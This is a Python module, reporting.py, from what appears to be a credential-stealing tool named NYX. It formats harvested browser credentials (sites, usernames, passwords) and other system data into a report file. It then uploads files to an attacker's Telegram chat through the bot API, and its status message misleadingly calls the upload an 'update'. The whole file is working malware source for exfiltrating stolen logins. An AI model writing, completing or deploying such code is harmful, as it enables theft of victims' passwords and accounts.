# nyx/core/reporting.py
import os
import zipfile
import requests
from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
from nyx.utils import decrypt

def write_results_to_file(results, return_path=False):
    report = "==================== SYSTEM REPORT ====================\n\n"

    if 'Browser Credentials' in results:
        report += "==================== SYSTEM REPORT FOR BROWSER CREDENTIALS ====================\n\n"
        for browser, sites in results['Browser Credentials'].items():
            report += f"[/] {browser}\n\n"
            for site, creds in sites.items():
                report += f"[Site] {site}\n"
                for credential in creds:
                    report += "username: {}\n".format(credential['username'])
                    report += "email: {}\n".format(credential['username'])  # using username as email for demonstration
                    report += "password: {}\n\n".format(credential['password'])
                report += "================================================================================\n"
            report += "================================END FOR {} =================================\n\n".format(browser)

    for header, content in results.items():
        if header != 'Browser Credentials':
            report += f"\n{header}\n"
            if isinstance(content, list):
                report += "\n".join(f"  - {line}" for line in content)
            else:
                report += f"  - {content}"
            report += "\n\n" + "=" * 50 + "\n\n"

    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    report_filename = os.path.join(desktop_path, "results_report.txt")

    try:
        with open(report_filename, "w", encoding="utf-8") as file:
            file.write(report)
        display_message("✅ Report created successfully on the Desktop.")
        if return_path:
            return report_filename
    except Exception as e:
        display_message(f"❌ Error writing report: {e}", "error")

def send_to_telegram(file_content, filename="file"):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        files = {"document": (filename, file_content)}
        data = {"chat_id": TELEGRAM_CHAT_ID}
        response = requests.post(url, data=data, files=files)
        if response.status_code == 200:
            display_message("✅ NYX Updated successfully.")
            return True
        else:
            display_message(f"❌ Failed to Update NYX. Response: {response.status_code} - {response.text}", "error")
            return False
    except Exception as e:
        display_message(f"Unexpected error: {e}", "error")
        return False

def display_message(message, level="info"):
    if level == "info":
        print(f"[+] {message}")
    elif level == "warning":
        print(f"[!] {message}")
    elif level == "error":
        print(f"[-] {message}")
